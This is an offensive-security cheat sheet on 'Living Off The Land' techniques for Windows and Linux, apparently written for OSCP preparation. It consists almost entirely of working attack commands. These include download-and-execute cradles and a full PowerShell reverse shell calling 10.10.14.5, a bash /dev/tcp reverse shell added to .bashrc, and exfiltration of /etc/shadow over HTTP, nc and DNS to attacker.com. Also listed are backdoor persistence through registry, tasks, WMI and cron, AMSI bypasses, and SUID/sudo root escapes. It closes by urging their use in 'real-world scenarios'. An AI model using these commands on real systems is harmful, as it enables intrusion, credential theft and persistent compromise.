# Living Off The Land (LOL) Comprehensive Guide

## Table of Contents
1. [LOL Concepts](#lol-concepts)
2. [Windows LOLBins (LOLBas)](#windows-lolbins-lolbas)
3. [Linux LOLBins (GTFOBins)](#linux-lolbins-gtfobins)
4. [File Download & Upload](#file-download--upload)
5. [Command Execution](#command-execution)
6. [Persistence](#persistence)
7. [Defense Evasion](#defense-evasion)
8. [Credential Access](#credential-access)
9. [Reconnaissance](#reconnaissance)
10. [OSCP Scenarios](#oscp-scenarios)

---

## LOL Concepts

### What is Living Off The Land?

**Definition**: Using legitimate, pre-installed system binaries and tools for malicious purposes instead of uploading custom malware.

### Benefits
- **Bypasses AV/EDR** - Legitimate binaries are trusted
- **No malware upload** - Uses existing tools
- **Stealth** - Blends with normal activity
- **File-less attacks** - Runs in memory
- **Defense evasion** - Harder to detect

### Key Resources
- **LOLBAS**: https://lolbas-project.github.io/ (Windows)
- **GTFOBins**: https://gtfobins.github.io/ (Linux)
- **WADComs**: https://wadcoms.github.io/ (Windows/AD)

---

## Windows LOLBins (LOLBas)

### File Download

#### certutil.exe
```cmd
# Download file
certutil.exe -urlcache -f http://10.10.14.5/nc.exe C:\Windows\Temp\nc.exe

# Download and execute
certutil.exe -urlcache -f http://10.10.14.5/payload.exe payload.exe && payload.exe

# Verify download
certutil.exe -urlcache -f http://10.10.14.5/file.txt file.txt

# Delete cache after download
certutil.exe -urlcache -f http://10.10.14.5/nc.exe nc.exe && certutil.exe -urlcache delete nc.exe
```

#### bitsadmin.exe
```cmd
# Download file
bitsadmin /transfer job /download /priority high http://10.10.14.5/nc.exe C:\Temp\nc.exe

# Multiple files
bitsadmin /create download
bitsadmin /addfile download http://10.10.14.5/file1.exe C:\Temp\file1.exe
bitsadmin /addfile download http://10.10.14.5/file2.exe C:\Temp\file2.exe
bitsadmin /resume download
bitsadmin /complete download
```

#### PowerShell (DownloadFile)
```powershell
# Download file
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.5/nc.exe','C:\Temp\nc.exe')"

# Download and execute
powershell -c "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.5/script.ps1')"

# Download string
powershell -c "$wc=New-Object System.Net.WebClient;$wc.DownloadString('http://10.10.14.5/file.txt')"
```

#### curl.exe (Windows 10 1803+)
```cmd
# Download
curl http://10.10.14.5/nc.exe -o C:\Temp\nc.exe

# Download and execute
curl http://10.10.14.5/payload.exe -o payload.exe && payload.exe
```

#### Invoke-WebRequest (PowerShell)
```powershell
# Download file
Invoke-WebRequest -Uri http://10.10.14.5/nc.exe -OutFile C:\Temp\nc.exe

# Short form
iwr -uri http://10.10.14.5/nc.exe -outfile nc.exe

# Download and execute
IEX(IWR http://10.10.14.5/script.ps1 -UseBasicParsing)
```

### File Upload

#### certutil.exe (Base64 Encode/Decode)
```cmd
# Encode file to base64
certutil.exe -encode C:\secrets.txt secrets_b64.txt

# Send via HTTP POST (with curl)
curl -X POST --data-binary @secrets_b64.txt http://10.10.14.5/upload
```

#### PowerShell Upload
```powershell
# Upload file via HTTP POST
powershell -c "$wc=New-Object System.Net.WebClient;$wc.UploadFile('http://10.10.14.5/upload','C:\secrets.txt')"

# Upload via Invoke-WebRequest
Invoke-WebRequest -Uri http://10.10.14.5/upload -Method POST -InFile C:\secrets.txt
```

### Command Execution

#### rundll32.exe
```cmd
# Execute JavaScript
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";alert('code')

# Execute DLL function
rundll32.exe C:\Windows\System32\comsvcs.dll,MiniDump

# Load URL
rundll32.exe url.dll,FileProtocolHandler http://10.10.14.5/payload.hta
```

#### mshta.exe (HTML Application)
```cmd
# Execute HTA from URL
mshta.exe http://10.10.14.5/payload.hta

# Execute JavaScript
mshta.exe javascript:alert('xss')

# Execute VBScript
mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""calc.exe"",0")(window.close)")
```

#### regsvr32.exe (Squiblydoo)
```cmd
# Execute scriptlet from URL
regsvr32.exe /s /n /u /i:http://10.10.14.5/payload.sct scrobj.dll

# Local execution
regsvr32.exe /s /u /i:file.sct scrobj.dll
```

#### wmic.exe
```cmd
# Execute command
wmic process call create "cmd.exe /c calc.exe"

# Remote execution
wmic /node:target process call create "cmd.exe /c payload.exe"

# Execute XSL
wmic process list /FORMAT:http://10.10.14.5/payload.xsl
```

#### forfiles.exe
```cmd
# Execute command
forfiles /p C:\Windows\System32 /m cmd.exe /c "cmd.exe /c calc.exe"

# Run payload
forfiles /p C:\Windows\System32 /m notepad.exe /c "C:\Temp\payload.exe"
```

#### msiexec.exe
```cmd
# Install MSI from URL (quiet)
msiexec /quiet /i http://10.10.14.5/payload.msi

# Uninstall with payload
msiexec /x {GUID} /qn
```

### Encoded/Obfuscated Execution

#### PowerShell Base64 Encoded
```powershell
# Create encoded command
$command = "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.5/shell.ps1')"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)

# Execute
powershell.exe -EncodedCommand $encodedCommand
```

#### certutil.exe (Decode Base64)
```cmd
# Encode payload on Kali
cat payload.exe | base64 > payload_b64.txt

# Upload base64 text (multiple methods)
# certutil, echo, etc.

# Decode on target
certutil.exe -decode payload_b64.txt payload.exe
```

### Persistence

#### schtasks.exe (Scheduled Tasks)
```cmd
# Create task to run at login
schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\payload.exe" /sc onlogon /ru System

# Create task to run every 5 minutes
schtasks /create /tn "Update" /tr "powershell -enc <base64>" /sc minute /mo 5

# Execute task immediately
schtasks /run /tn "WindowsUpdate"
```

#### reg.exe (Registry Run Keys)
```cmd
# Add to Run key (HKCU)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Temp\payload.exe"

# Add to Run key (HKLM - requires admin)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Temp\payload.exe"

# RunOnce key
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Backdoor /t REG_SZ /d "C:\Temp\payload.exe"
```

#### sc.exe (Services)
```cmd
# Create service
sc create "WindowsUpdate" binPath= "C:\Temp\payload.exe" start= auto

# Start service
sc start "WindowsUpdate"

# Query service
sc query "WindowsUpdate"
```

### Defense Evasion

#### Alternate Data Streams (ADS)
```cmd
# Hide file in ADS
type payload.exe > normal.txt:hidden.exe

# Execute from ADS
wmic process call create "C:\normal.txt:hidden.exe"

# Or with start
start C:\normal.txt:hidden.exe
```

#### Living-Off-The-Land AV Bypass
```cmd
# Instead of nc.exe, use PowerShell
powershell -nop -c "$client=New-Object System.Net.Sockets.TCPClient('10.10.14.5',443);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# Instead of uploading exe, use mshta
mshta http://10.10.14.5/payload.hta
```

### Reconnaissance

#### net.exe
```cmd
# Domain enumeration
net user /domain
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain

# Local enumeration
net user
net localgroup administrators
net accounts

# Shares
net share
net view \\target
net use \\target\c$ /user:domain\user password
```

#### wmic.exe
```cmd
# System info
wmic computersystem get domain,name,username
wmic os get caption,version,osarchitecture

# Installed software
wmic product get name,version

# Running processes
wmic process list brief

# Services
wmic service list brief

# Network
wmic nicconfig get ipaddress,macaddress
```

#### PowerShell Enumeration
```powershell
# AD enumeration
Get-ADUser -Filter *
Get-ADComputer -Filter *
Get-ADGroup -Filter *

# Local enumeration
Get-LocalUser
Get-LocalGroup
Get-Process
Get-Service

# Network
Get-NetIPAddress
Get-NetRoute
Get-NetTCPConnection
```

---

## Linux LOLBins (GTFOBins)

### File Read

#### cat
```bash
# Read file
cat /etc/passwd

# SUID exploitation
./cat /etc/shadow
```

#### less/more
```bash
# Read file
less /etc/passwd

# SUID exploitation
./less /etc/shadow
# Then type: !/bin/sh (shell escape)
```

#### tail/head
```bash
# Read file
tail /etc/passwd
head /etc/shadow

# SUID
./tail /etc/shadow
```

#### awk
```bash
# Read file
awk '{print}' /etc/passwd

# SUID
./awk 'BEGIN {system("/bin/sh")}'
```

#### sed
```bash
# Read file
sed '' /etc/passwd

# SUID shell
./sed -n '1e exec /bin/sh' /etc/hosts
```

### File Write

#### tee
```bash
# Write file (append)
echo "ssh-rsa AAA..." | tee -a /root/.ssh/authorized_keys

# SUID
echo "user ALL=(ALL) NOPASSWD: ALL" | ./tee -a /etc/sudoers
```

#### dd
```bash
# Write file
echo "content" | dd of=/tmp/file.txt

# SUID
echo "content" | ./dd of=/etc/passwd
```

#### cp
```bash
# Copy file
cp /etc/passwd /tmp/passwd.bak

# SUID - overwrite file
./cp /tmp/malicious /etc/passwd
```

### Command Execution

#### find
```bash
# Execute command
find . -exec /bin/sh \; -quit

# SUID shell
./find . -exec /bin/sh -p \; -quit

# Sudo
sudo find /etc -exec /bin/sh \;
```

#### vim/vi
```bash
# Shell escape
vim
:!/bin/sh

# SUID
./vim -c ':!/bin/sh'

# Sudo
sudo vim -c ':!/bin/sh'
```

#### python/python3
```bash
# Execute command
python -c 'import os; os.system("/bin/sh")'

# SUID
./python -c 'import os; os.setuid(0); os.system("/bin/sh")'

# Sudo
sudo python -c 'import os; os.system("/bin/sh")'
```

#### perl
```bash
# Execute command
perl -e 'exec "/bin/sh";'

# SUID
./perl -e 'exec "/bin/sh";'

# Sudo
sudo perl -e 'exec "/bin/sh";'
```

#### ruby
```bash
# Execute command
ruby -e 'exec "/bin/sh"'

# SUID
./ruby -e 'exec "/bin/sh"'
```

#### nmap (older versions)
```bash
# Interactive mode
nmap --interactive
!sh

# Execute script
echo "os.execute('/bin/sh')" > /tmp/script.nse
sudo nmap --script=/tmp/script.nse
```

### File Download

#### wget
```bash
# Download file
wget http://10.10.14.5/shell.sh

# SUID (read file via POST)
./wget --post-file=/etc/shadow http://10.10.14.5/
```

#### curl
```bash
# Download file
curl http://10.10.14.5/shell.sh -o shell.sh

# SUID (exfiltrate file)
./curl -F "file=@/etc/shadow" http://10.10.14.5/upload
```

### File Upload

#### wget
```bash
# Upload via POST
wget --post-file=/etc/passwd http://10.10.14.5/upload
```

#### curl
```bash
# Upload file
curl -F "file=@/etc/shadow" http://10.10.14.5/upload

# Upload via PUT
curl -T /etc/passwd http://10.10.14.5/upload
```

#### scp
```bash
# Upload to remote
scp /etc/shadow user@10.10.14.5:/tmp/shadow
```

### Privilege Escalation (SUID/Sudo)

#### bash
```bash
# SUID
./bash -p

# Sudo
sudo bash
```

#### tar
```bash
# SUID
./tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

# Sudo
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

#### zip
```bash
# SUID
./zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/sh"

# Sudo
sudo zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/sh"
```

#### git
```bash
# SUID
./git help config
!/bin/sh

# Sudo
sudo git -p help
!/bin/sh
```

#### docker
```bash
# Sudo (escape to root)
sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

#### systemctl
```bash
# Sudo - create service with payload
export cmd='[Service]\nType=oneshot\nExecStart=/bin/sh -c "chmod +s /bin/bash"\n[Install]\nWantedBy=multi-user.target'
echo -e "$cmd" | sudo systemctl link /tmp/exploit.service
sudo systemctl enable --now /tmp/exploit.service
/bin/bash -p
```

---

## File Download & Upload

### Windows Download Methods (Comparison)

```cmd
# certutil (stealthy, built-in)
certutil -urlcache -f http://10.10.14.5/nc.exe nc.exe

# PowerShell (powerful, flexible)
powershell -c "IWR -Uri http://10.10.14.5/nc.exe -OutFile nc.exe"

# curl (Windows 10+)
curl http://10.10.14.5/nc.exe -o nc.exe

# bitsadmin (background transfer)
bitsadmin /transfer job http://10.10.14.5/nc.exe C:\Temp\nc.exe

# SMB (no HTTP needed)
copy \\10.10.14.5\share\nc.exe C:\Temp\nc.exe
```

### Linux Download Methods (Comparison)

```bash
# wget (most common)
wget http://10.10.14.5/shell.sh

# curl (alternative)
curl http://10.10.14.5/shell.sh -o shell.sh

# Direct execution (no disk write)
curl http://10.10.14.5/shell.sh | bash
wget -O - http://10.10.14.5/shell.sh | bash

# Python (if wget/curl missing)
python -c "import urllib; urllib.urlretrieve('http://10.10.14.5/shell.sh', 'shell.sh')"

# nc (if nc available)
nc 10.10.14.5 8000 > shell.sh
# Server: nc -lvnp 8000 < shell.sh
```

---

## Command Execution

### Windows Remote Execution

#### PsExec (LOLBin Alternative)
```cmd
# Instead of uploading PsExec, use wmic
wmic /node:target /user:admin /password:pass process call create "cmd.exe /c payload.exe"

# Or PowerShell remoting
powershell Invoke-Command -ComputerName target -Credential (Get-Credential) -ScriptBlock {whoami}
```

#### WinRM (LOLBin)
```cmd
# Enable WinRM
winrm quickconfig

# Execute remotely
winrs -r:target -u:admin -p:pass cmd
```

### Linux Remote Execution

#### SSH (LOLBin)
```bash
# Execute command via SSH
ssh user@target 'whoami'

# Execute script
ssh user@target 'bash -s' < local_script.sh
```

---

## Persistence

### Windows Persistence (LOLBins Only)

#### WMI Event Subscription
```powershell
# Create filter (every 60 seconds)
$FilterArgs = @{name='PersistFilter'; EventNameSpace='root\cimv2'; QueryLanguage='WQL'; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"}
$Filter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments $FilterArgs

# Create consumer
$ConsumerArgs = @{name='PersistConsumer'; CommandLineTemplate='cmd.exe /c C:\Temp\payload.exe'}
$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\subscription -Arguments $ConsumerArgs

# Bind
$BindArgs = @{Filter=$Filter; Consumer=$Consumer}
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments $BindArgs
```

### Linux Persistence (LOLBins Only)

#### Cron Job
```bash
# User crontab (no file write needed)
(crontab -l; echo "* * * * * /tmp/payload.sh") | crontab -

# System cron (if writable)
echo "* * * * * root /tmp/payload.sh" >> /etc/crontab
```

#### .bashrc
```bash
# Add to user .bashrc
echo 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1 &' >> ~/.bashrc
```

---

## Defense Evasion

### AMSI Bypass (PowerShell)

```powershell
# Bypass AMSI (method 1)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Bypass AMSI (method 2)
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
```

### Obfuscation (PowerShell)

```powershell
# String obfuscation
$cmd = "IEX"
$cmd = $cmd.Replace("I","I")
Invoke-Expression $cmd(...)

# Character substitution
$c='IE'+'X';& $c (...)

# Base64
$b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('IEX(...))
powershell -enc $b64
```

---

## Credential Access

### Windows Credentials (LOLBins)

#### cmdkey (Saved Credentials)
```cmd
# List saved credentials
cmdkey /list

# Use saved credentials
runas /savecred /user:DOMAIN\Administrator cmd.exe
```

#### reg.exe (Registry Credentials)
```cmd
# Check for autologon password
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# Saved credentials
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### Linux Credentials (LOLBins)

#### grep (Search for Passwords)
```bash
# Search history
grep -r "password" ~/.bash_history

# Search config files
grep -r "password" /etc/ 2>/dev/null
grep -r "pass" /home/ 2>/dev/null
```

---

## Reconnaissance

### Windows Recon (LOLBins Only)

#### Complete Enumeration Script
```cmd
@echo off
echo === SYSTEM INFO ===
systeminfo
hostname
echo.
echo === USERS ===
net user
net localgroup administrators
echo.
echo === NETWORK ===
ipconfig /all
netstat -ano
route print
arp -a
echo.
echo === PROCESSES ===
tasklist /v
echo.
echo === SERVICES ===
sc query
echo.
echo === SHARES ===
net share
net view
echo.
echo === SCHEDULED TASKS ===
schtasks /query /fo LIST /v
```

### Linux Recon (LOLBins Only)

#### Complete Enumeration Script
```bash
#!/bin/bash
echo "=== SYSTEM INFO ==="
uname -a
hostname
cat /etc/os-release

echo -e "\n=== USERS ==="
cat /etc/passwd
groups
id

echo -e "\n=== NETWORK ==="
ip a
ip route
netstat -tulpn
arp -a

echo -e "\n=== PROCESSES ==="
ps aux

echo -e "\n=== CRON JOBS ==="
cat /etc/crontab
ls -la /etc/cron.*

echo -e "\n=== SUID BINARIES ==="
find / -perm -4000 2>/dev/null

echo -e "\n=== WRITABLE DIRECTORIES ==="
find / -writable -type d 2>/dev/null
```

---

## OSCP Scenarios

### Scenario 1: Windows - File Download without PowerShell

```cmd
# Situation: PowerShell blocked, need to download nc.exe

# Method 1: certutil
certutil -urlcache -f http://10.10.14.5/nc.exe nc.exe

# Method 2: bitsadmin
bitsadmin /transfer download /priority high http://10.10.14.5/nc.exe C:\Temp\nc.exe

# Method 3: msiexec (if MSI available)
msiexec /quiet /i http://10.10.14.5/nc.msi

# Method 4: curl (Windows 10+)
curl http://10.10.14.5/nc.exe -o nc.exe
```

### Scenario 2: Linux - Privilege Escalation via SUID

```bash
# Find SUID binaries
find / -perm -4000 2>/dev/null

# Found: /usr/bin/find (SUID)
# Exploit:
/usr/bin/find . -exec /bin/sh -p \; -quit

# Now root shell
```

### Scenario 3: Windows Persistence without File Write

```cmd
# Use WMI Event + existing executable

# Create WMI event that triggers on login
# Use existing binary like mshta.exe to execute remote HTA

powershell "$Filter=Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments @{name='Persist';EventNameSpace='root\cimv2';QueryLanguage='WQL';Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour=8 AND TargetInstance.Minute=0\"};$Consumer=Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\subscription -Arguments @{name='Persist';CommandLineTemplate='mshta.exe http://10.10.14.5/payload.hta'};Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments @{Filter=$Filter;Consumer=$Consumer}"
```

### Scenario 4: Linux File Exfiltration

```bash
# Situation: Need to exfiltrate /etc/shadow

# Method 1: wget POST
wget --post-file=/etc/shadow http://10.10.14.5:8000/

# Method 2: curl POST
curl -F "file=@/etc/shadow" http://10.10.14.5:8000/upload

# Method 3: Base64 encode and DNS exfil
cat /etc/shadow | base64 | while read line; do dig $line.attacker.com; done

# Method 4: nc
cat /etc/shadow | nc 10.10.14.5 8000
```

---

## Quick Reference

### Windows Top 10 LOLBins
```
1. certutil.exe - Download, encode/decode
2. PowerShell - Everything
3. mshta.exe - Execute HTA/JS/VBS
4. rundll32.exe - Execute DLL functions
5. wmic.exe - Execute commands, recon
6. regsvr32.exe - Execute scriptlets
7. bitsadmin.exe - Download files
8. schtasks.exe - Persistence
9. reg.exe - Registry operations
10. net.exe - Enumeration
```

### Linux Top 10 LOLBins
```
1. bash/sh - Shell execution
2. python/python3 - Scripting, execution
3. wget/curl - Download/upload
4. find - SUID exploitation
5. vim/vi - Shell escape
6. tar - SUID exploitation
7. awk/sed - File operations, execution
8. nc - File transfer
9. ssh - Remote execution
10. docker - Container escape
```

---

**Remember**: Living Off The Land is about using what's already there. Master these techniques for stealth and evasion in OSCP and real-world scenarios!
